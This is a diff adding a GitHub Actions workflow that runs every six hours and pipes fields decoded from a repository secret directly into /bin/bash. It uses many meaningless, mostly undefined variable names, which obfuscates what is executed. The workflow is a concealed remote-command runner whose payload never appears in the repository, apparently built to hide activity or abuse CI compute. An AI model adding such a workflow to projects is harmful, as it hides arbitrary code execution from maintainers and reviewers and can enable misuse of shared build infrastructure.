@@ -1,0 +1,30 @@
+name: wuguoduojian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuguoduojian
+        env:
+          stef5: ${{ secrets.stef5 }}
+        run: |
+          echo $stef5 | jq -r .zxzae99568 | /bin/bash
+          echo $byj3 | jq -r .ndgb99 | /bin/bash
+          echo $kudg9800 | jq -r .c620 | /bin/bash
+          echo $iujcu3 | jq -r .iy6728 | /bin/bash
+          echo $hv9 | jq -r .g8 | /bin/bash
+          echo $okvk14994 | jq -r .qdrl62 | /bin/bash
+          echo $jblhk8682 | jq -r .c3308 | /bin/bash
+          echo $xoura1477 | jq -r .g5753 | /bin/bash
+          echo $bf42054 | jq -r .fbiq6749 | /bin/bash
+          echo $yxqa06422 | jq -r .lelif63894 | /bin/bash
+          echo $pcxdy493 | jq -r .gt96 | /bin/bash
+          echo $u049 | jq -r .qo5912 | /bin/bash
+          echo $yoo74404 | jq -r .rddi2234 | /bin/bash
+          echo $kyjql5 | jq -r .oqvq8 | /bin/bash
+
